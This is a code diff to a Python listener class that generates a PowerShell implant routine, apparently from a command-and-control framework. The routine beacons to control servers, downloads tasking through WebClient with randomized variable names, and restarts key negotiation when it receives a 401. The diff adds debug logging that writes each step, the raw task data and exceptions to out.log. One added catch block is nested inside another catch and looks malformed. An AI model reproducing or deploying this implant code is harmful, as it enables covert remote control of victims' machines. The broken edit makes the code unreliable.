@@ -826,12 +826,16 @@ class Listener:
                         param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
+                        "inside gettask before try"|Out-File "out.log" -Append -NoClobber
                         try {{
                             if ($ControlServers[$ServerIndex].StartsWith("http")) {{
+                                "if contrlserver startwith http" |Out-File "out.log" -Append -NoClobber
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                                "built routing packet" |Out-File "out.log" -Append -NoClobber
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+                                "prparing routing packt for tasking request"|Out-File "out.log" -Append -NoClobber
 
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
@@ -850,14 +854,23 @@ class Listener:
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"] | Get-Random
                                 $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
+                                "got result"|Out-File "out.log" -Append -NoClobber
+                                $result|Out-File "out.log" -Append -NoClobber
                                 $result
                             }}
                         }}
                         catch [Net.WebException] {{
+                            "got an exception net web"|Out-File "out.log" -Append -NoClobber
+                            $_.Exception.GetBaseException()|Out-File "out.log" -Append -NoClobber
                             if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
                             }}
+                       catch {{
+                            "got an exception"|Out-File "out.log" -Append -NoClobber
+
+                            $_.Exception.Exception.Message|Out-File "out.log" -Append -NoClobber
+                       }}
                         }}
                     }}
                 """
